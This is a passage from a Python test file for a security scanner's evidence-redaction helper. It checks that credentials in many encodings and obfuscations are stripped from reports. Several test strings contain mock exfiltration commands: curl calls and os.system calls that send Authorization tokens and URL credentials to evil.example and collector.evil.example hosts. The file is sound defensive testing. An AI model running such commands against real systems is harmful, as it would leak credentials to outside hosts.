"""Tests for scanner evidence redaction helpers."""

import os
import subprocess
import sys
from collections.abc import Callable
from pathlib import Path
from typing import Any
from urllib.parse import quote

import pytest

from modelaudit.scanners import _catboost_evidence_redaction as evidence_redaction
from modelaudit.scanners._catboost_evidence_redaction import REDACTED_EVIDENCE_VALUE, redact_evidence_string


def test_redacts_compound_credential_assignments() -> None:
    """Compound credential keys should not preserve raw values."""
    text = (
        "client_secret=CLIENTSECRET123 "
        "refresh_token='REFRESHTOKEN456' "
        'access-token="ACCESSTOKEN789" '
        "service-private-key=PRIVATEKEY000"
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "ACCESSTOKEN789" not in redacted
    assert "PRIVATEKEY000" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"refresh_token={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"access-token={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"service-private-key={REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_escaped_quoted_credential_assignments() -> None:
    """Escaped quotes in serialized evidence should not leave the quoted value behind."""
    text = (
        r"client_secret=\"ESCAPEDCLIENTSECRET123\" "
        r"api_key=\\\"NESTEDESCAPEDAPIKEY321\\\" "
        r"Authorization: Bearer \"ESCAPEDBEARER456\" "
        r"Authorization: Bearer \\\"NESTEDESCAPEDBEARER654\\\" "
        r"Bearer \"ESCAPEDSTANDALONE789\""
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "ESCAPEDCLIENTSECRET123" not in redacted
    assert "NESTEDESCAPEDAPIKEY321" not in redacted
    assert "ESCAPEDBEARER456" not in redacted
    assert "NESTEDESCAPEDBEARER654" not in redacted
    assert "ESCAPEDSTANDALONE789" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_attacker_supplied_redacted_marker_prefixes() -> None:
    """A literal '<redacted>' prefix in attacker evidence is not proof that the rest is safe."""
    text = (
        r"api_key=\"<redacted>\"MARKER_API_SUFFIX_SECRET123 "
        r"Authorization: Bearer \"<redacted>\"MARKER_AUTH_SUFFIX_SECRET456"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "MARKER_API_SUFFIX_SECRET123" not in redacted
    assert "MARKER_AUTH_SUFFIX_SECRET456" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_backslash_prefixed_unquoted_credentials() -> None:
    """Backslash-prefixed serialized values should still use the fallback redactor."""
    text = (
        r"api_key=\SLASHAPISECRET123 "
        r"Authorization: \SLASHAUTHSECRET456 "
        r"client_secret=\u0022UNICODEESCAPEDSECRET789\u0022"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "SLASHAPISECRET123" not in redacted
    assert "SLASHAUTHSECRET456" not in redacted
    assert "UNICODEESCAPEDSECRET789" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted


def test_preserves_command_context_after_authorization_header_redaction() -> None:
    """Shell header redaction should not swallow the URL that proves the command sink."""
    text = (
        'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
        "https://user:pass123@evil.example/payload?token=tok_runtime"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "sk-runtime-secret" not in redacted
    assert "pass123" not in redacted
    assert "tok_runtime" not in redacted
    assert "curl" in redacted
    assert "evil.example" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "token=<redacted>" in redacted


def test_preserves_nested_command_url_after_quoted_authorization_redaction() -> None:
    secret = "sk-nested-command-secret1234567890"
    query_secret = "nested-query-secret"
    text = f"os.system(\"curl -H 'Authorization: Bearer {secret}' https://evil.example/payload?token={query_secret}\")"

    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert query_secret not in redacted
    assert "curl -H" in redacted
    assert "evil.example/payload" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "token=<redacted>" in redacted


def test_bare_authorization_value_redacts_token_before_context() -> None:
    """Authorization without a known scheme should redact the first token, not the following evidence."""
    text = "Authorization: sk-live-secret curl https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "sk-live-secret" not in redacted
    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "curl" in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        (
            "Authorization: ApiKey MYSECRET123 curl https://collector.evil.example/upload",
            "MYSECRET123",
        ),
        (
            'curl -H "Authorization: OAuth MYSECRET456" https://collector.evil.example/upload',
            "MYSECRET456",
        ),
    ],
)
def test_unknown_authorization_scheme_redacts_credential_before_context(text: str, secret: str) -> None:
    """Unknown Authorization schemes should not leave their credential token behind."""
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert "curl" in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


@pytest.mark.parametrize(
    ("text", "secret", "expected_context"),
    [
        ('awsSecretAccessKey=hunter2 os.system("id")', "hunter2", 'os.system("id")'),
        (
            "proxy_authorization: Basic proxy-secret curl https://collector.evil.example/upload",
            "proxy-secret",
            "curl https://collector.evil.example/upload",
        ),
        (
            "proxyAuthorization=Bearer camel-secret curl https://collector.evil.example/upload",
            "camel-secret",
            "curl https://collector.evil.example/upload",
        ),
    ],
)
def test_shared_sensitive_key_aliases_redact_values(
    text: str,
    secret: str,
    expected_context: str,
) -> None:
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted
    assert expected_context in redacted


def test_authorization_near_match_is_not_treated_as_credential_key() -> None:
    text = 'proxy_authorization_mode=basic os.system("id")'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "proxy_authorization_mode=basic" in redacted
    assert 'os.system("id")' in redacted


def test_redaction_runtime_is_bounded_before_truncation() -> None:
    """Evidence redaction should not scan attacker-controlled megabyte strings before truncating."""
    text = "api_key=" + ("\\\\" * 200_000) + '"unterminated-secret'

    redacted = redact_evidence_string(text, max_chars=120)

    assert len(redacted) <= 120
    assert redacted.startswith(f"api_key={REDACTED_EVIDENCE_VALUE}")


def test_composed_key_normalization_is_bounded_for_many_string_literals() -> None:
    text = "payload = " + " + ".join(f'"{index:08x}"' for index in range(40)) + '; os.system("id")'

    redacted = redact_evidence_string(text, max_chars=160)

    assert len(redacted) <= 160
    assert redacted.startswith('payload = "00000000" + "00000001"')


def test_composed_quoted_sensitive_key_with_equals_is_redacted() -> None:
    text = '"client" + "_secret" = "C001_COMPOSED_EQUALS_SECRET_123456"'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "C001_COMPOSED_EQUALS_SECRET" not in redacted
    assert redacted == f"client_secret={REDACTED_EVIDENCE_VALUE}"


@pytest.mark.parametrize("operator", ["==", "!=", ">=", "<="])
def test_composed_quoted_sensitive_key_comparisons_are_redacted(operator: str) -> None:
    text = f'"client" + "_secret" {operator} "public"'

    redacted = redact_evidence_string(text, max_chars=500)

    assert "public" not in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_redacts_long_delimited_values_before_report_truncation() -> None:
    """Long URLs and quoted Bearer values should be redacted even when delimiters are far away."""
    long_url_secret = "LONGURLPASSWORDSECRET123"
    long_bearer_secret = "LONGBEARERSECRET456"
    text = (
        f"https://user:{long_url_secret}{'a' * 5000}@collector.evil.example/upload "
        rf"Bearer \"{long_bearer_secret}{'b' * 5000}\""
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert long_url_secret not in redacted
    assert long_bearer_secret not in redacted
    assert "https://<credentials-redacted>@collector.evil.example/upload" in redacted
    assert f"Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_long_quoted_values_with_internal_delimiters() -> None:
    """If a long quoted sensitive value is cut before closing, redact the whole reportable prefix."""
    cases = [
        (
            f'api_key="prefix C001_LONG_SPACE_API_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SPACE_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'Authorization: Bearer "prefix;C001_LONG_SEMI_AUTH_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SEMI_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'Bearer "prefix C001_LONG_SPACE_BEARER_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SPACE_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u0022prefix C001_UNICODE_SPACE_SECRET_123456\u0022",
            "C001_UNICODE_SPACE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u0022prefix;C001_UNICODE_AUTH_SECRET_123456\u0022",
            "C001_UNICODE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u0022prefix C001_UNICODE_BEARER_SECRET_123456\u0022",
            "C001_UNICODE_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\u0022prefix C001_ENCBACKSLASH_API_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u005c\u0022prefix;C001_ENCBACKSLASH_AUTH_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\u0022prefix C001_ENCBACKSLASH_BEARER_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\u0027prefix C001_ENCBACKSLASH_SINGLE_SECRET_123456\u005c\u0027",
            "C001_ENCBACKSLASH_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\u0022prefix C001_DOUBLEENC_API_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \\u005c\\u0022prefix;C001_DOUBLEENC_AUTH_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \\u005c\\u0022prefix C001_DOUBLEENC_BEARER_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\u0027prefix C001_DOUBLEENC_SINGLE_SECRET_123456\\u005c\\u0027",
            "C001_DOUBLEENC_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\"prefix C001_MIXED_API_SECRET_123456\u005c\"",
            "C001_MIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u005c\"prefix;C001_MIXED_AUTH_SECRET_123456\u005c\"",
            "C001_MIXED_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\"prefix C001_MIXED_BEARER_SECRET_123456\u005c\"",
            "C001_MIXED_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\\"prefix C001_DOUBLEMIXED_API_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \\u005c\\\"prefix;C001_DOUBLEMIXED_AUTH_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \\u005c\\\"prefix C001_DOUBLEMIXED_BEARER_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\'prefix C001_MIXED_SINGLE_SECRET_123456\u005c\'",
            "C001_MIXED_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x22prefix C001_HEX_API_SECRET_123456\x22",
            "C001_HEX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \x22prefix;C001_HEX_AUTH_SECRET_123456\x22",
            "C001_HEX_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \x22prefix C001_HEX_BEARER_SECRET_123456\x22",
            "C001_HEX_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x27prefix C001_HEX_SINGLE_SECRET_123456\x27",
            "C001_HEX_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x5c\x22prefix C001_HEXBACKSLASH_API_SECRET_123456\x5c\x22",
            "C001_HEXBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \x5c\x22prefix;C001_HEXBACKSLASH_AUTH_SECRET_123456\x5c\x22",
            "C001_HEXBACKSLASH_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\x22prefix C001_UNICODE_HEX_BEARER_SECRET_123456\u005c\x22",
            "C001_UNICODE_HEX_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x5c\"prefix C001_HEXMIXED_API_SECRET_123456\x5c\"",
            "C001_HEXMIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\042prefix C001_OCTAL_API_SECRET_123456\042",
            "C001_OCTAL_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \042prefix;C001_OCTAL_AUTH_SECRET_123456\042",
            "C001_OCTAL_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\047prefix C001_OCTAL_SINGLE_SECRET_123456\047",
            "C001_OCTAL_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\134\042prefix C001_OCTALBACKSLASH_API_SECRET_123456\134\042",
            "C001_OCTALBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \U00000022prefix C001_LONGU_BEARER_SECRET_123456\U00000022",
            "C001_LONGU_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u{22}prefix;C001_JSU_AUTH_SECRET_123456\u{22}",
            "C001_JSU_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\U0000005c\U00000022prefix C001_LONGUBACKSLASH_API_SECRET_123456\U0000005c\U00000022",
            "C001_LONGUBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u{5c}\u{22}prefix C001_JSUBACKSLASH_BEARER_SECRET_123456\u{5c}\u{22}",
            "C001_JSUBACKSLASH_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\42prefix C001_SHORTOCT_API_SECRET_123456\42",
            "C001_SHORTOCT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \42prefix;C001_SHORTOCT_AUTH_SECRET_123456\42",
            "C001_SHORTOCT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\47prefix C001_SHORTOCT_SINGLE_SECRET_123456\47",
            "C001_SHORTOCT_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u{0022}prefix C001_PADJS_BEARER_SECRET_123456\u{0022}",
            "C001_PADJS_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u{005c}\u{0022}prefix;C001_PADJSBS_AUTH_SECRET_123456\u{005c}\u{0022}",
            "C001_PADJSBS_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="""prefix C001_TRIPLE_API_SECRET_123456"""',
            "C001_TRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer """prefix;C001_TRIPLE_AUTH_SECRET_123456"""',
            "C001_TRIPLE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=r"prefix C001_PREFIX_API_SECRET_123456"',
            "C001_PREFIX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer f"prefix;C001_PREFIX_AUTH_SECRET_123456"',
            "C001_PREFIX_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'client_secret="""prefix C001_LONGTRIPLE_API_SECRET_123456{"a" * 5000}',
            "C001_LONGTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\uu0022prefix C001_UU_API_SECRET_123456\uu0022",
            "C001_UU_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\"\"\"prefix C001_ESCTRIPLE_API_SECRET_123456\"\"\"",
            "C001_ESCTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u0022\u0022\u0022prefix;C001_UNITRIPLE_AUTH_SECRET_123456\u0022\u0022\u0022",
            "C001_UNITRIPLE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=r\u0022\u0022\u0022prefix C001_PUNITRIPLE_API_SECRET_123456\u0022\u0022\u0022",
            "C001_PUNITRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f"client_secret=r\\u0022\\u0022\\u0022prefix C001_LONG_UNITRIPLE_API_SECRET_123456{'a' * 5000}",
            "C001_LONG_UNITRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix C001_PAREN_API_SECRET_123456")',
            "C001_PAREN_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " "C001_CONCAT_API_SECRET_123456"',
            "C001_CONCAT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " """C001_CONCAT_TRIPLE_SECRET_123456"""',
            "C001_CONCAT_TRIPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;" "C001_CONCAT_AUTH_SECRET_123456"',
            "C001_CONCAT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " + "C001_PLUS_API_SECRET_123456"',
            "C001_PLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix " + "C001_PARENPLUS_API_SECRET_123456")',
            "C001_PARENPLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " + """C001_PLUSTRIPLE_API_SECRET_123456"""',
            "C001_PLUSTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;" + "C001_PLUS_AUTH_SECRET_123456"',
            "C001_PLUS_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix %s" % "C001_PERCENT_API_SECRET_123456"',
            "C001_PERCENT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix %s" % "C001_PARENPERCENT_API_SECRET_123456")',
            "C001_PARENPERCENT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;%s" % "C001_PERCENT_AUTH_SECRET_123456"',
            "C001_PERCENT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "client_secret=''.join(('prefix ', 'C001_JOIN_API_SECRET_123456'))",
            "C001_JOIN_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix {}".format("C001_FORMAT_API_SECRET_123456")',
            "C001_FORMAT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "".join(("prefix;", "C001_JOIN_AUTH_SECRET_123456"))',
            "C001_JOIN_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="" or "C001_OR_API_SECRET_123456"',
            "C001_OR_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="decoy" if False else "C001_ELSE_API_SECRET_123456"',
            "C001_ELSE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="" * 0 + "C001_MATHPLUS_API_SECRET_123456"',
            "C001_MATHPLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("C001_CALLFIRST_API_SECRET_123456")',
            "C001_CALLFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=["C001_LISTFIRST_API_SECRET_123456"][0]',
            "C001_LISTFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=(lambda: "C001_LAMBDAFIRST_API_SECRET_123456")()',
            "C001_LAMBDAFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("token=decoy C001_INNERPREFIX_API_SECRET_123456")',
            "C001_INNERPREFIX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("Authorization: Bearer decoy C001_INNERAUTH_API_SECRET_123456")',
            "C001_INNERAUTH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'client_secret=str("quote: \" token=decoy C001_ESCINNER_API_SECRET_123456")',
            "C001_ESCINNER_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'client_secret=str("quote: \" Authorization: Bearer decoy C001_ESCAUTH_API_SECRET_123456")',
            "C001_ESCAUTH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret": "C001_JSONKEY_CLIENT_SECRET_123456"}',
            "C001_JSONKEY_CLIENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "config={'api_key': 'C001_JSONKEY_API_SECRET_123456'}",
            "C001_JSONKEY_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"client\u005fsecret": "C001_KEYUNICODE_CLIENT_SECRET_123456"}',
            "C001_KEYUNICODE_CLIENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"api\x5fkey": "C001_KEYHEX_API_SECRET_123456"}',
            "C001_KEYHEX_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"config={\"client\\u005fsecret\": \"C001_DOUBLEKEY_SECRET_123456\"}",
            "C001_DOUBLEKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"config={\"api\\x5fkey\": \"C001_DOUBLEAPIKEY_SECRET_123456\"}",
            "C001_DOUBLEAPIKEY_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"client\U0000005fsecret": "C001_KEYLONGU_SECRET_123456"}',
            "C001_KEYLONGU_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"api\N{LOW LINE}key": "C001_KEYNAMED_SECRET_123456"}',
            "C001_KEYNAMED_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client" + "_secret": "C001_KEYPLUS_SECRET_123456"}',
            "C001_KEYPLUS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"api" "_key": "C001_KEYIMPLICIT_SECRET_123456"}',
            "C001_KEYIMPLICIT_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client%s" % "_secret": "C001_KEYPERCENT_SECRET_123456"}',
            "C001_KEYPERCENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client{}".format("_secret"): "C001_KEYFORMAT_SECRET_123456"}',
            "C001_KEYFORMAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client{suffix}".format(suffix="_secret"): "C001_KEYKWFORMAT_SECRET_123456"}',
            "C001_KEYKWFORMAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\'}": "C001_KEYFSTRING_SECRET_123456"}',
            "C001_KEYFSTRING_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\'!s}": "C001_KEYFCONV_SECRET_123456"}',
            "C001_KEYFCONV_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\':s}": "C001_KEYFSPEC_SECRET_123456"}',
            "C001_KEYFSPEC_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("client_secret"): "C001_KEYSTRCALL_SECRET_123456"}',
            "C001_KEYSTRCALL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".strip(): "C001_KEYSTRIP_SECRET_123456"}',
            "C001_KEYSTRIP_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"".join(("client", "_secret")): "C001_KEYJOIN_SECRET_123456"}',
            "C001_KEYJOIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"__client_secret__".strip("_"): "C001_KEYSTRIPARG_SECRET_123456"}',
            "C001_KEYSTRIPARG_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"clientXsecret".replace("X", "_"): "C001_KEYREPLACE_SECRET_123456"}',
            "C001_KEYREPLACE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret",)[0]: "C001_KEYINDEX_SECRET_123456"}',
            "C001_KEYINDEX_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"terces_tneilc"[::-1]: "C001_KEYREVERSE_SECRET_123456"}',
            "C001_KEYREVERSE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"TERCES_TNEILC"[::-1].lower(): "C001_KEYREVERSELOWER_SECRET_123456"}',
            "C001_KEYREVERSELOWER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("terces_tneilc" * 1)[::-1]: "C001_KEYREVERSEMULT_SECRET_123456"}',
            "C001_KEYREVERSEMULT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"TERCES_TNEILC"[::-1].swapcase(): "C001_KEYSWAPCASE_SECRET_123456"}',
            "C001_KEYSWAPCASE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".zfill(0): "C001_KEYZFILL_SECRET_123456"}',
            "C001_KEYZFILL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client" + "_secret").zfill(0): "C001_KEYCOMPOSEDZFILL_SECRET_123456"}',
            "C001_KEYCOMPOSEDZFILL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
